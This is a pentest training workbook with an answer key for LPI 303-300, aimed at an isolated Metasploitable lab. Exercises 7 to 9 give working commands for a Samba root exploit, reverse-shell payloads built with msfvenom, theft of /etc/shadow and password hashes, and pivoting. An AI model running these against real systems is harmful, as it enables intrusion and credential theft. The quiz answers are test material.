# Topic 335.2: Penetration Testing — Guided Exercises

> **Exam:** LPI 303-300, version 3.0.0 · **Objective weight:** 5
> **Official objective:** <https://www.lpi.org/our-certifications/exam-303-objectives/>
> **Scope of these exercises:** the mechanics of a penetration test as tested by LPI — the phases of an engagement, host discovery and enumeration with **nmap** and the **Nmap Scripting Engine (NSE)**, driving the **Metasploit Framework** (`msfconsole`, module types, `meterpreter`), and building standalone payloads with **msfvenom**.

---

## Before you start: authorization and lab isolation

Every technique below is offensive by nature. Running it against a host you do not own, or outside a written scope, is a crime in most jurisdictions and a violation of the PTES pre-engagement phase. **These exercises target a lab you build yourself, on an isolated network, against intentionally vulnerable images.** Nothing here should ever touch a production network or a third party.

**Lab topology used throughout:**

| Role | Hostname | Address | Image |
|---|---|---|---|
| Attacker | `kali` | `192.168.56.10` | Kali Linux (or any distro with nmap + Metasploit) |
| Target | `metasploitable` | `192.168.56.101` | Metasploitable 2 |

Both machines sit on a **host-only / internal** hypervisor network `192.168.56.0/24` with **no gateway to the Internet or the LAN**. Metasploitable 2 is deliberately riddled with vulnerabilities; never bridge it to a real network.

Sources:
- PTES Technical Guidelines — <http://www.pentest-standard.org/index.php/Main_Page>
- Metasploitable 2 documentation — <https://docs.rapid7.com/metasploit/metasploitable-2/>

---

## Exercise 1 — The phases of a penetration test

LPI expects you to name and order the phases of an engagement and to place each tool in the right phase. Before touching a tool, internalize the model.

**Steps**

1. Read the PTES seven-phase model and map it in a note file:

   ```
   1. Pre-engagement Interactions   -> scope, rules of engagement (RoE), authorization
   2. Intelligence Gathering        -> reconnaissance (passive + active)
   3. Threat Modeling               -> which assets, which attack paths
   4. Vulnerability Analysis        -> identify weaknesses (maps to 335.1)
   5. Exploitation                  -> gain access
   6. Post-Exploitation             -> pivot, persist, assess impact
   7. Reporting                     -> findings, risk, remediation
   ```

2. Classify **reconnaissance** into its two sub-types and give one tool for each:

   ```
   Passive recon  -> no packets to the target (whois, DNS, search engines, Shodan)
   Active recon   -> packets sent to the target (nmap host discovery, banner grabbing)
   ```

3. Distinguish **enumeration** from reconnaissance. Write a one-line definition:

   ```
   Enumeration = actively querying an already-discovered service to extract
   concrete objects: usernames, shares, SNMP OIDs, SMTP recipients, service
   versions. It is deeper and noisier than discovery.
   ```

4. Note the two engagement styles you will be asked to contrast:

   ```
   Black box -> tester has no prior knowledge (external attacker simulation)
   White box -> tester has full knowledge (source, creds, architecture)
   Grey box  -> partial knowledge (a typical "assumed breach" test)
   ```

**Verify your understanding**

- **Q1.1** In which PTES phase does the signed authorization / Rules of Engagement belong, and why must it precede everything else?
- **Q1.2** A tester runs `nmap -sn` against the target range. Is that passive or active reconnaissance? Justify.
- **Q1.3** Where does **vulnerability analysis** sit relative to **exploitation**, and which LPI objective covers it separately?

---

## Exercise 2 — Reconnaissance: host discovery with nmap

Goal: find live hosts on `192.168.56.0/24` without yet scanning ports.

**Steps**

1. Confirm your attacker address and route to the lab network:

   ```bash
   ip -4 addr show
   ip route get 192.168.56.101
   ```

2. Run a **ping sweep** (host discovery only — the `-sn` flag disables the port scan):

   ```bash
   nmap -sn 192.168.56.0/24
   ```

   Expected (abridged):

   ```
   Starting Nmap 7.94 ( https://nmap.org )
   Nmap scan report for 192.168.56.10
   Host is up (0.00021s latency).
   Nmap scan report for 192.168.56.101
   Host is up (0.00042s latency).
   MAC Address: 08:00:27:AB:CD:EF (Oracle VirtualBox virtual NIC)
   Nmap done: 256 IP addresses (2 hosts up) scanned in 2.11 seconds
   ```

3. Understand *how* `-sn` decides a host is up on a local segment. On the same layer-2 network nmap uses **ARP requests** (fast and reliable), not ICMP. Prove it by forcing nmap to skip ARP:

   ```bash
   sudo nmap -sn --send-ip 192.168.56.101
   ```

   Then compare the probe traffic:

   ```bash
   sudo nmap -sn --packet-trace 192.168.56.101 2>&1 | head
   ```

   Expected trace lines show `ARP who-has 192.168.56.101 tell 192.168.56.10`.

4. Off-segment, nmap falls back to ICMP echo, TCP SYN to 443, TCP ACK to 80, and ICMP timestamp. See those probe types listed:

   ```bash
   nmap -sn -PE -PS443 -PA80 -PP 192.168.56.101
   ```

**Verify your understanding**

- **Q2.1** What exactly does `nmap -sn` do, and what does it deliberately *not* do?
- **Q2.2** On the same LAN, which layer-2 mechanism does nmap use for host discovery, and why is it more reliable than ICMP echo there?
- **Q2.3** A firewall drops all ICMP. Which nmap host-discovery probes could still mark the host "up", and which flags request them?

---

## Exercise 3 — Port scanning and service/version enumeration

Goal: enumerate open ports and identify the software behind them on the target.

**Steps**

1. Run a default **TCP SYN scan** (the half-open scan; requires root because it crafts raw packets):

   ```bash
   sudo nmap -sS 192.168.56.101
   ```

   Expected (abridged — Metasploitable 2 is intentionally wide open):

   ```
   PORT     STATE SERVICE
   21/tcp   open  ftp
   22/tcp   open  ssh
   23/tcp   open  telnet
   25/tcp   open  smtp
   80/tcp   open  http
   139/tcp  open  netbios-ssn
   445/tcp  open  microsoft-ds
   3306/tcp open  mysql
   5432/tcp open  postgresql
   ```

2. Contrast scan types and know the difference:

   ```bash
   sudo nmap -sS 192.168.56.101      # SYN / half-open: never completes the handshake
   nmap -sT 192.168.56.101           # TCP connect(): full handshake, no root needed, noisier
   sudo nmap -sU --top-ports 20 192.168.56.101   # UDP scan (slow; relies on ICMP port-unreachable)
   ```

3. Understand nmap's six **port states**. Add version detection and an all-ports scan:

   ```bash
   sudo nmap -sS -sV -p- 192.168.56.101
   ```

   - `-p-` scans all 65535 TCP ports (default is the top 1000).
   - `-sV` probes each open port to fingerprint the **product and version**.

   Expected (abridged):

   ```
   PORT     STATE SERVICE     VERSION
   21/tcp   open  ftp         vsftpd 2.3.4
   22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
   80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
   445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
   3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
   ```

4. Add OS detection and tune timing/aggression:

   ```bash
   sudo nmap -sS -sV -O -T4 192.168.56.101
   ```

   `-O` guesses the OS from TCP/IP stack fingerprints; `-T4` is the aggressive-but-safe timing template (`-T0` paranoid … `-T5` insane). `-A` bundles `-sV -O --script=default --traceroute`.

5. Save output in all three formats for the report and for feeding other tools:

   ```bash
   sudo nmap -sS -sV -oA scans/metasploitable_full 192.168.56.101
   # produces .nmap (human), .gnmap (grepable), .xml (machine / Metasploit import)
   ```

**Verify your understanding**

- **Q3.1** Why does `-sS` require root privileges while `-sT` does not, and which is stealthier?
- **Q3.2** Name three of nmap's port states and explain the difference between `filtered` and `closed`.
- **Q3.3** What does `-sV` do that a plain SYN scan cannot, and why is `vsftpd 2.3.4` in the output an immediate red flag?
- **Q3.4** Which single output flag writes normal, grepable, and XML files at once, and why is the XML the one Metasploit wants?

---

## Exercise 4 — The Nmap Scripting Engine (NSE)

Goal: move from "port is open" to concrete findings using NSE, the Lua engine that turns nmap into a lightweight vulnerability scanner and enumerator.

**Steps**

1. Learn the script layout and categories:

   ```bash
   ls /usr/share/nmap/scripts/ | head
   nmap --script-help "default"        # what runs with -sC / --script=default
   ```

   NSE categories you must recognize: `auth`, `broadcast`, `brute`, `default`, `discovery`, `dos`, `exploit`, `external`, `fuzzer`, `intrusive`, `malware`, `safe`, `version`, `vuln`.

2. Run the **default** scripts alongside version detection (`-sC` is shorthand for `--script=default`):

   ```bash
   sudo nmap -sV -sC 192.168.56.101
   ```

3. Enumerate SMB — a classic LPIC-3 target. Run a category of scripts against the SMB ports:

   ```bash
   sudo nmap -p139,445 --script "smb-os-discovery,smb-enum-shares,smb-enum-users" 192.168.56.101
   ```

   Expected (abridged):

   ```
   Host script results:
   | smb-os-discovery:
   |   OS: Unix (Samba 3.0.20-Debian)
   |   Computer name: metasploitable
   | smb-enum-shares:
   |   \\192.168.56.101\tmp    Anonymous access: READ/WRITE
   | smb-enum-users:
   |   METASPLOITABLE\msfadmin (RID: 1000)
   ```

4. Run the **vuln** category to flag known CVEs (uses `--script-args` for tuning):

   ```bash
   sudo nmap -sV --script "vuln" -p21,80,445 192.168.56.101
   ```

   Expected to surface findings such as `smb-vuln-ms08-067`, `http-slowloris-check`, and the backdoored `ftp-vsftpd-backdoor` (CVE-2011-2523).

5. Select scripts with boolean/wildcard expressions and pass arguments:

   ```bash
   # everything "safe" AND matching http-*, but not brute
   sudo nmap -p80 --script "safe and http-*" 192.168.56.101
   # HTTP enumeration with a specific wordlist argument
   sudo nmap -p80 --script http-enum --script-args http-enum.basepath=/ 192.168.56.101
   ```

6. Update the script database after adding scripts:

   ```bash
   sudo nmap --script-updatedb
   ```

**Verify your understanding**

- **Q4.1** What is `-sC` shorthand for, and which NSE category does it run?
- **Q4.2** Why would you avoid running the `intrusive`, `dos`, or `brute` categories against a client's production system without explicit written permission?
- **Q4.3** Write the `--script` selector that runs all scripts that are both `safe` **and** whose name starts with `smb-`.
- **Q4.4** Which NSE category turns nmap into a vulnerability scanner, and what does `ftp-vsftpd-backdoor` detect on this target?

Sources:
- Nmap Reference Guide — <https://nmap.org/book/man.html>
- NSE documentation & script categories — <https://nmap.org/book/nse.html> · <https://nmap.org/nsedoc/>

---

## Exercise 5 — Metasploit Framework: msfconsole, the database, and importing scans

Goal: start Metasploit, back it with PostgreSQL, and pull your nmap results into a workspace.

**Steps**

1. Initialize the database and launch the console:

   ```bash
   sudo msfdb init          # creates the PostgreSQL database and role
   msfconsole -q            # -q suppresses the banner
   ```

2. Confirm database connectivity and create a dedicated workspace:

   ```
   msf6 > db_status
   [*] Connected to msf. Connection type: postgresql.

   msf6 > workspace -a lpic3-lab
   [*] Added workspace: lpic3-lab
   msf6 > workspace lpic3-lab
   ```

3. Populate the workspace two ways — import the XML from Exercise 3, or scan through Metasploit with `db_nmap` (same nmap, results auto-stored):

   ```
   msf6 > db_import scans/metasploitable_full.xml
   [*] Successfully imported .../metasploitable_full.xml

   msf6 > db_nmap -sV 192.168.56.101
   ```

4. Query the stored objects:

   ```
   msf6 > hosts
   msf6 > services
   msf6 > services -p 445 -R          # set RHOSTS to hosts running SMB
   msf6 > vulns
   ```

   `services -R` and `hosts -R` push matching addresses into `RHOSTS` for the next module — the workflow the exam expects you to know.

**Verify your understanding**

- **Q5.1** What database backs Metasploit, and what does `msfdb init` create?
- **Q5.2** Give two ways to get nmap results into the Metasploit database, and name the workspace command that isolates one engagement from another.
- **Q5.3** What does `services -p 445 -R` do to the global `RHOSTS` datastore option?

---

## Exercise 6 — Metasploit module types, and running an auxiliary module

Goal: understand the module taxonomy LPI lists, then run an **auxiliary** scanner.

**Steps**

1. Memorize the module types and what each does:

   ```
   auxiliary -> scanning, fuzzing, brute-forcing, DoS — anything that is not a
                full exploit and does not deliver a payload
   exploit   -> code that leverages a vulnerability to run a payload on the target
   payload   -> the code that runs after successful exploitation (shell, meterpreter)
   encoder   -> transforms a payload to evade byte constraints / naive signatures
   nop       -> no-operation generators for padding/sled alignment
   post      -> post-exploitation modules, run against an existing session
   evasion   -> modules built specifically to bypass AV/defenses
   ```

2. Search the module database and read a module's metadata:

   ```
   msf6 > search type:auxiliary name:smb_version
   msf6 > use auxiliary/scanner/smb/smb_version
   msf6 auxiliary(scanner/smb/smb_version) > info
   msf6 auxiliary(scanner/smb/smb_version) > show options
   ```

3. Set options and run the scanner:

   ```
   msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.56.101
   msf6 auxiliary(scanner/smb/smb_version) > run
   [*] 192.168.56.101:445 - SMB Detected (versions:1) (preferred dialect:) ...
   [*] 192.168.56.101:445 -   Host is running Unix, Samba 3.0.20-Debian
   ```

4. Run a login/brute auxiliary against FTP to see credential enumeration (still auxiliary — no payload delivered):

   ```
   msf6 > use auxiliary/scanner/ftp/ftp_login
   msf6 auxiliary(scanner/ftp/ftp_login) > set RHOSTS 192.168.56.101
   msf6 auxiliary(scanner/ftp/ftp_login) > set USER_FILE users.txt
   msf6 auxiliary(scanner/ftp/ftp_login) > set PASS_FILE passwords.txt
   msf6 auxiliary(scanner/ftp/ftp_login) > run
   ```

**Verify your understanding**

- **Q6.1** List the module types and state the single line that distinguishes an **auxiliary** module from an **exploit** module.
- **Q6.2** What is the difference between a **payload** and an **encoder**?
- **Q6.3** Which command loads a module into the current context, and which two commands reveal its required options and its description?

---

## Exercise 7 — Exploitation: gaining a meterpreter session

Goal: exploit a known vulnerability on the target and land a **meterpreter** session, then contrast staged vs. stageless and bind vs. reverse payloads.

**Steps**

1. Select a reliable exploit for this target. The Samba `usermap_script` command-injection (CVE-2007-2447) is a clean example:

   ```
   msf6 > search usermap_script
   msf6 > use exploit/multi/samba/usermap_script
   msf6 exploit(multi/samba/usermap_script) > info
   ```

2. Inspect and choose a **payload**. List what is compatible, then read the naming grammar:

   ```
   msf6 exploit(multi/samba/usermap_script) > show payloads
   ```

   Payload name grammar (know how to read it):

   ```
   cmd/unix/reverse            -> platform/arch/direction, single-stage (stageless)
   linux/x86/meterpreter/reverse_tcp
        ^os   ^arch ^payload   ^stager  (the "/" before reverse_tcp marks it STAGED)
   ```

   - **Staged** (`meterpreter/reverse_tcp`): a tiny stager runs first, then pulls the large stage over the connection. Small initial footprint.
   - **Stageless / single** (`meterpreter_reverse_tcp`, or `cmd/unix/reverse`): the whole payload ships at once. More robust across flaky links.
   - **reverse**: target connects back to *you* (`LHOST`/`LPORT`) — beats inbound firewalls/NAT.
   - **bind**: target opens a listener and *you* connect to it — fails if inbound is filtered.

3. Set the payload and required options, then exploit:

   ```
   msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.101
   msf6 exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse
   msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.56.10
   msf6 exploit(multi/samba/usermap_script) > set LPORT 4444
   msf6 exploit(multi/samba/usermap_script) > exploit
   [*] Started reverse TCP double handler on 192.168.56.10:4444
   [*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.101:...)
   id
   uid=0(root) gid=0(root)
   ```

4. Get a full **meterpreter** session against a service that supports it. Use the vsftpd 2.3.4 backdoor or, for a meterpreter payload demo, a Java/HTTP target. Here, upgrade the shell to meterpreter:

   ```
   msf6 > sessions -l                       # list active sessions
   msf6 > sessions -u 1                      # upgrade shell session 1 to meterpreter
   msf6 > sessions -i 2                      # interact with meterpreter session 2
   meterpreter > sysinfo
   Computer     : metasploitable
   OS           : Linux metasploitable 2.6.24-16-server
   Meterpreter  : x86/linux
   ```

5. Background and manage sessions without killing them:

   ```
   meterpreter > background          # Ctrl+Z equivalent, returns to msf prompt
   msf6 > sessions -K                # kill ALL sessions (cleanup)
   ```

**Verify your understanding**

- **Q7.1** In `linux/x86/meterpreter/reverse_tcp`, identify the OS, architecture, payload, and stager, and say whether it is staged or stageless.
- **Q7.2** Your target sits behind NAT with all inbound ports filtered but unrestricted outbound. Do you choose a **bind** or a **reverse** payload, and which datastore options (`LHOST`/`LPORT` vs `RHOST`/`RPORT`) must you set?
- **Q7.3** What advantage does a **meterpreter** payload give you over a plain `cmd/unix/reverse` shell?
- **Q7.4** Which command backgrounds a session, and which lists all active sessions?

---

## Exercise 8 — Post-exploitation with meterpreter

Goal: use the session to demonstrate impact — the phase that produces the findings that matter in the report.

**Steps**

1. Basic situational awareness:

   ```
   meterpreter > getuid
   meterpreter > sysinfo
   meterpreter > ifconfig
   meterpreter > ps
   ```

2. File operations and loot collection:

   ```
   meterpreter > pwd
   meterpreter > download /etc/passwd loot/passwd
   meterpreter > download /etc/shadow loot/shadow
   meterpreter > cat /etc/issue
   ```

3. Run a **post** module against the session (note: post modules take `SESSION`, not `RHOSTS`):

   ```
   meterpreter > background
   msf6 > use post/linux/gather/hashdump
   msf6 post(linux/gather/hashdump) > set SESSION 2
   msf6 post(linux/gather/hashdump) > run
   ```

4. Pivoting — route traffic from a second subnet through the session so Metasploit can reach hosts you otherwise can't:

   ```
   meterpreter > run autoroute -s 10.10.10.0/24
   msf6 > use auxiliary/scanner/portscan/tcp
   msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.10.10.0/24
   msf6 auxiliary(scanner/portscan/tcp) > run          # now reaches the inner net via session 2
   ```

**Verify your understanding**

- **Q8.1** A post-exploitation module needs to know which compromised host to act on — which datastore option carries that, and how does it differ from `RHOSTS`?
- **Q8.2** In one sentence, what is **pivoting**, and which meterpreter command sets up the route?
- **Q8.3** Why is downloading `/etc/shadow` a demonstration of impact rather than an end in itself, and what would you do with it next (naming the LPIC-3 tool from an adjacent objective)?

---

## Exercise 9 — msfvenom: standalone payloads and encoders

Goal: generate payloads outside of an exploit — the way a tester delivers code through phishing, a file upload, or a web shell — and understand encoding and its limits.

**Steps**

1. See the interface. `msfvenom` replaced the old `msfpayload`/`msfencode` pair:

   ```bash
   msfvenom --list payloads   | head
   msfvenom --list formats
   msfvenom --list encoders
   ```

2. Generate a Linux reverse-shell ELF:

   ```bash
   msfvenom -p linux/x86/meterpreter/reverse_tcp \
            LHOST=192.168.56.10 LPORT=4444 \
            -f elf -o /tmp/shell.elf
   ```

   Key flags: `-p` payload, `-f` output **format** (`elf`, `exe`, `raw`, `python`, `war`, `php`, `psh`), `-o` output file, `LHOST/LPORT` as payload options.

3. Generate a PHP web shell to drop through a file upload, and a Windows EXE for contrast:

   ```bash
   msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw -o shell.php
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o shell.exe
   ```

4. Apply an **encoder** and restrict **bad characters** — the classic use case where the target parser chokes on nulls/newlines:

   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 \
            -e x86/shikata_ga_nai -i 5 -b '\x00\x0a\x0d' -f exe -o /tmp/enc.exe
   ```

   `-e` encoder, `-i` iterations, `-b` bad-char list to avoid. Understand that `shikata_ga_nai` is a **polymorphic XOR encoder for reliability/bad-char avoidance — not a guaranteed AV bypass**; modern engines detect its decoder stub.

5. Catch the callback. A msfvenom payload is only half the tool — you still need a handler:

   ```
   msf6 > use exploit/multi/handler
   msf6 exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
   msf6 exploit(multi/handler) > set LHOST 192.168.56.10
   msf6 exploit(multi/handler) > set LPORT 4444
   msf6 exploit(multi/handler) > run
   [*] Started reverse TCP handler on 192.168.56.10:4444
   ```

   The `PAYLOAD`, `LHOST`, and `LPORT` on the handler **must match** those baked into the msfvenom output, or the stager/stage negotiation fails.

**Verify your understanding**

- **Q9.1** Which two legacy tools did `msfvenom` consolidate, and what do `-p`, `-f`, and `-e` control?
- **Q9.2** What is the real, defensible purpose of `-b '\x00\x0a\x0d'` with an encoder — and what is encoding *not* a reliable substitute for?
- **Q9.3** After delivering an msfvenom `reverse_tcp` payload, which Metasploit module receives the connection, and which three settings on it must match the generated payload?

Sources:
- Metasploit Framework documentation — <https://docs.metasploit.com/>
- Metasploit user guide (Rapid7) — <https://docs.rapid7.com/metasploit/>
- msfvenom reference — <https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html>

---

## Exercise 10 — Awareness: the wider toolset and reporting

LPI's "awareness of common tools" bullet means you should recognize the ecosystem, not just nmap and Metasploit.

**Steps**

1. Match each tool to its phase:

   ```
   Recon / OSINT     -> whois, dig, theHarvester, recon-ng, Shodan, Maltego
   Web app testing   -> Burp Suite, OWASP ZAP, nikto, gobuster/dirb, sqlmap, wpscan
   Enumeration       -> nmap + NSE, enum4linux, smbclient, snmpwalk
   Exploitation      -> Metasploit, searchsploit / Exploit-DB, sqlmap
   Password attacks  -> hydra (online), john / hashcat (offline)
   C2 / post-exploit -> meterpreter, Empire, Cobalt Strike, Sliver
   ```

2. Find a local exploit for a discovered version with the Exploit-DB CLI:

   ```bash
   searchsploit vsftpd 2.3.4
   searchsploit samba 3.0.20
   ```

3. Structure a finding for the report the way PTES expects — each finding carries: title, affected asset, description, evidence/PoC, business impact, likelihood, CVSS score, and remediation:

   ```
   Finding:      Samba "username map script" Command Injection (CVE-2007-2447)
   Asset:        192.168.56.101 (445/tcp, Samba 3.0.20-Debian)
   Severity:     Critical (CVSS 3.1: 9.8)
   Evidence:     meterpreter session as uid=0(root); see screenshot 4.
   Remediation:  Upgrade Samba >= 3.0.25; disable "username map script".
   ```

**Verify your understanding**

- **Q10.1** Name one tool for online password attacks and one for offline password cracking, and state why the offline attack is usually preferred once you have the hashes.
- **Q10.2** Which tool searches the offline Exploit-DB copy from the command line, and how would you use its result if it's a Metasploit module?
- **Q10.3** Beyond the raw PoC, name three fields a professional finding must contain for the client to prioritize remediation.

---

<details>
<summary><strong>Answer key — click to expand</strong></summary>

### Exercise 1
- **A1.1** The signed authorization / Rules of Engagement belongs to **Pre-engagement Interactions** (PTES phase 1). It must precede everything because sending a single probe without written authorization and a defined scope is illegal (unauthorized access) and exposes the tester to liability; the RoE also fixes targets, timing, methods, and emergency contacts.
- **A1.2** **Active** reconnaissance. `-sn` sends packets *to* the target (ARP on-segment, or ICMP/TCP probes off-segment). Passive recon sends nothing to the target — it uses third-party sources like whois, DNS, or Shodan.
- **A1.3** **Vulnerability analysis (PTES phase 4)** comes *before* **exploitation (phase 5)**: you identify weaknesses, then leverage them. LPI covers it separately under objective **335.1** (Common Security Vulnerabilities and Threats / vulnerability testing), while 335.2 focuses on the penetration-testing process and exploitation tooling.

### Exercise 2
- **A2.1** `-sn` performs **host discovery only** ("ping scan"): it determines which hosts are up. It deliberately **skips the port scan**, so it reports no port states.
- **A2.2** On the same layer-2 segment nmap uses **ARP requests**. It is more reliable than ICMP echo because a host must answer ARP to participate in the network at all, whereas hosts and firewalls routinely drop ICMP echo; ARP is also faster and cannot be filtered by an IP-layer firewall.
- **A2.3** With ICMP dropped, host discovery can still succeed via **TCP SYN probes** (`-PS<ports>`), **TCP ACK probes** (`-PA<ports>`), **UDP probes** (`-PU<ports>`), and **SCTP INIT** (`-PY`). ICMP-based probes `-PE` (echo), `-PP` (timestamp), `-PM` (netmask) would be the ones that fail.

### Exercise 3
- **A3.1** `-sS` crafts **raw SYN packets** and reads raw responses, which requires root/`CAP_NET_RAW`. `-sT` uses the OS `connect()` syscall (unprivileged). `-sS` is **stealthier** because it never completes the three-way handshake (sends RST after SYN/ACK), so the connection is often not logged by the application; `-sT` completes the handshake and is more likely logged.
- **A3.2** Any three of: `open`, `closed`, `filtered`, `unfiltered`, `open|filtered`, `closed|filtered`. **`closed`** means the host replied (typically TCP RST) — reachable but nothing listening. **`filtered`** means nmap got no useful reply (dropped by a firewall/ACL), so it cannot tell whether a service is there — the packet was blocked.
- **A3.3** `-sV` sends service probes and matches the responses against nmap's fingerprint database to report the **product name and version** (e.g. `vsftpd 2.3.4`), which a SYN scan can only guess from the port number. `vsftpd 2.3.4` is a red flag because that specific release shipped with a **compromised backdoor (CVE-2011-2523)** that opens a root shell on port 6200.
- **A3.4** `-oA <basename>` writes `.nmap`, `.gnmap`, and `.xml` at once. Metasploit's `db_import` consumes the **XML** because it is structured/machine-readable, letting Metasploit populate hosts, services, and ports exactly.

### Exercise 4
- **A4.1** `-sC` is shorthand for `--script=default`; it runs the **`default`** NSE category (safe, generally useful scripts like `http-title`, `ssh-hostkey`, `smb-os-discovery`).
- **A4.2** Those categories are **noisy or damaging**: `dos` can crash the service, `brute` can lock out accounts and generate massive auth logs, `intrusive` may alter state or trip IDS. Running them without written permission can violate the RoE, cause an outage, and create legal exposure.
- **A4.3** `--script "safe and smb-*"`.
- **A4.4** The **`vuln`** category. `ftp-vsftpd-backdoor` detects the malicious backdoor built into **vsftpd 2.3.4 (CVE-2011-2523)**, which spawns a root shell when a username containing `:)` is submitted.

### Exercise 5
- **A5.1** **PostgreSQL**. `msfdb init` creates the PostgreSQL database and role that Metasploit uses to store hosts, services, vulns, loot, and sessions, and writes the connection config.
- **A5.2** (1) `db_import <file>.xml` to load an existing nmap XML; (2) `db_nmap <args>` to scan from inside msfconsole and auto-store results. **`workspace`** (`workspace -a <name>` to add, `workspace <name>` to switch) isolates engagements.
- **A5.3** It selects stored services on port **445** and, because of `-R`, writes each matching host address into the global **`RHOSTS`** datastore option, so the next module targets exactly those hosts.

### Exercise 6
- **A6.1** Types: **auxiliary, exploit, payload, encoder, nop, post, evasion**. Distinguishing line: an **exploit** leverages a vulnerability to **deliver and run a payload** on the target; an **auxiliary** module does everything else (scan, brute-force, fuzz, DoS) and **delivers no payload**.
- **A6.2** A **payload** is the code that executes on the target after successful exploitation (e.g. a reverse shell or meterpreter). An **encoder** merely **transforms** an existing payload's bytes — to avoid bad characters or dodge naive signatures — without changing what the payload does.
- **A6.3** `use <module/path>` loads it. `show options` lists required/optional settings; `info` shows the description, references, and targets.

### Exercise 7
- **A7.1** OS = **linux**, architecture = **x86**, payload = **meterpreter**, stager = **reverse_tcp**. The `/` separating `meterpreter` from `reverse_tcp` marks it **staged** (a small stager loads the larger stage over the connection).
- **A7.2** Choose a **reverse** payload — the target initiates the outbound connection, which passes NAT and an inbound-filtering firewall. Set **`LHOST`** (your attacker IP) and **`LPORT`** (your listening port); `RHOST`/`RPORT` are for bind payloads where you connect *in*.
- **A7.3** Meterpreter is an **in-memory, extensible payload** offering a rich API — file transfer (`upload`/`download`), `sysinfo`, process migration, `hashdump`, pivoting/`autoroute`, and encrypted transport — rather than a bare command shell. It is stealthier (runs in memory, no new process needed) and far more capable for post-exploitation.
- **A7.4** `background` (or `Ctrl+Z`) backgrounds the current session; `sessions -l` (or just `sessions`) lists all active sessions.

### Exercise 8
- **A8.1** **`SESSION`** carries the ID of the compromised host's session; a post module acts *through an existing session*. `RHOSTS` names network targets to scan/attack from scratch — post modules don't use it.
- **A8.2** **Pivoting** is using a compromised host as a relay to reach a network segment you cannot route to directly. `run autoroute -s <subnet>` (meterpreter) adds the route through the session.
- **A8.3** `/etc/shadow` contains only password **hashes**, so obtaining it proves impact (you can now attempt to recover credentials) but is not itself access. Next you crack it **offline** with **john (John the Ripper)** or hashcat to recover plaintext passwords for reuse/lateral movement.

### Exercise 9
- **A9.1** `msfvenom` consolidated **`msfpayload`** (payload generation) and **`msfencode`** (encoding). `-p` selects the **payload**, `-f` the output **format** (elf/exe/raw/php/…), `-e` the **encoder**.
- **A9.2** `-b '\x00\x0a\x0d'` tells msfvenom to **produce shellcode that avoids those bad bytes** (null, line-feed, carriage-return) which would truncate or corrupt the payload in the target's parser (e.g. a string-copy buffer). Encoding is for **reliability / bad-char avoidance**, **not** a reliable **AV/EDR bypass** — `shikata_ga_nai`'s decoder stub is itself signatured.
- **A9.3** The **`exploit/multi/handler`** module receives the callback. Its **`PAYLOAD`**, **`LHOST`**, and **`LPORT`** must exactly match the values baked into the msfvenom output, or the connection/stage negotiation fails.

### Exercise 10
- **A10.1** Online: **hydra** (or medusa/patator) — attacks the live service. Offline: **john** or **hashcat** — cracks captured hashes. Offline is preferred once you hold the hashes because it is **fast (no network round-trip), silent (no auth logs, no lockouts), and unlimited in attempts**.
- **A10.2** **`searchsploit`** queries the local Exploit-DB copy. If the result is a Metasploit module, note its path and load it with `use <module>`; if it is standalone exploit code, `searchsploit -m <id>` copies it locally to adapt and run.
- **A10.3** Any three of: **affected asset**, **severity/CVSS score**, **evidence/PoC**, **business impact**, **likelihood**, and **remediation** — these let the client rank and fix issues rather than just see that they were exploitable.

</details>